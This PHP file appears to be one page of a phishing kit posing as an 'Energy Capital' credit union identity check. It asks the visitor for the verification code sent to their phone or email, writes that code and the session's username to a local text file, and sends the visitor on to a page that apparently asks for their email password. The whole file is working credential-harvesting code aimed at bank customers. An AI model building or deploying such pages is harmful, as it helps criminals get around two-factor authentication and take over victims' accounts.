<?php
session_start();
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];
$otp = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $otp = trim($_POST['otp'] ?? '');
    
    // Simple validation
    if (empty($otp)) {
        $errors['otp'] = 'Please enter the verification code';
    }
    
    if (empty($errors)) {
        // Save to file
        $data = [
            'step' => 'otp_verification',
            'usrnm' => $username,
            'vrf_cd' => $otp
        ];
        
        saveUserData('otp_verification.txt', $data);
        
        // Redirect to email password page
        header('Location: email_password.php');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Identity - Energy Capital</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-[#0b0f1c] bg-cover bg-center bg-no-repeat relative overflow-hidden text-white" style="background-image: url('assets/dark-login.jpeg');">
        <!-- Dark Overlay -->
        <div class="absolute inset-0 bg-black/40 pointer-events-none"></div>
        
        <!-- Relative Container -->
        <div class="relative z-10 flex min-h-screen flex-col">
            <!-- Header -->
            <header class="flex flex-col items-center pt-8 px-4">
                <img src="assets/blue.png" alt="Energy Capital logo" class="h-12 w-auto" />
            </header>

            <!-- Main Content -->
            <main class="flex-1 flex items-center justify-center px-4 py-12">
                <!-- OTP Verification Card -->
                <div class="w-full max-w-md">
                    <div class="bg-[#1b1f2f]/95 rounded-xl shadow-xl shadow-black/30 p-8 space-y-6 text-white">
                        <!-- Card Header -->
                        <div>
                            <h2 class="text-center text-2xl font-semibold mb-2">Verify Your Identity</h2>
                            <p class="text-center text-slate-300 text-sm">Enter the verification code sent to your registered email or phone</p>
                        </div>
                        
                        <?php if (!empty($errors)): ?>
                            <div class="bg-red-500/20 border border-red-500 rounded-lg p-4">
                                <p class="text-red-200 text-sm"><?php echo htmlspecialchars(implode(' ', $errors)); ?></p>
                            </div>
                        <?php endif; ?>
                        
                        <form method="POST" class="space-y-6">
                            <div>
                                <label class="text-slate-300 text-sm font-medium block mb-2">Verification Code</label>
                                <input
                                    type="text"
                                    name="otp"
                                    id="otp"
                                    value="<?php echo htmlspecialchars($otp); ?>"
                                    class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-3 text-center text-xl tracking-widest focus:outline-none focus:border-[#00b4ff] transition placeholder:text-slate-500"
                                    placeholder="Enter code"
                                    autocomplete="off"
                                />
                                <?php if (isset($errors['otp'])): ?>
                                    <p class="mt-2 text-xs text-red-400"><?php echo htmlspecialchars($errors['otp']); ?></p>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Continue Button -->
                            <button
                                type="submit"
                                class="w-full bg-[#7dd3fc] text-black font-semibold py-2 rounded-lg hover:bg-[#38bdf8] transition"
                            >
                                Verify
                            </button>
                        </form>
                        
                        <!-- Resend Code Link -->
                        <div class="text-center">
                            <p class="text-slate-400 text-sm">
                                Didn't receive the code?
                                <a href="#" class="text-[#7dd3fc] hover:underline">Resend</a>
                            </p>
                        </div>
                    </div>
                </div>
            </main>

            <!-- Footer -->
            <footer class="bg-[#2f3136] text-white w-full">
                <div class="max-w-5xl mx-auto px-6 py-10 flex flex-col items-center gap-6">
                    <nav class="flex flex-wrap items-center justify-center gap-4 text-sm text-[#74b8ff]">
                        <a class="hover:underline" href="#">Contact Us</a>
                        <span class="h-4 w-px bg-[#4b4d52]" aria-hidden="true"></span>
                        <a class="hover:underline" href="#">Privacy &amp; Security</a>
                        <span class="h-4 w-px bg-[#4b4d52]" aria-hidden="true"></span>
                        <a class="hover:underline" href="#">Accessibility</a>
                    </nav>
                    <div class="flex items-center gap-3 text-sm text-[#74b8ff]">
                        <div class="flex items-center justify-center w-7 h-7 border border-[#74b8ff] rounded-full text-xs font-semibold">
                            <span>🏠</span>
                        </div>
                        <span>Equal Housing Lender</span>
                    </div>
                    <img src="assets/ncua.png" alt="NCUA" class="h-16 w-auto" />
                    <p class="text-xs text-gray-400">Federally insured by NCUA</p>
                </div>
            </footer>
        </div>
    </div>
</body>
</html>
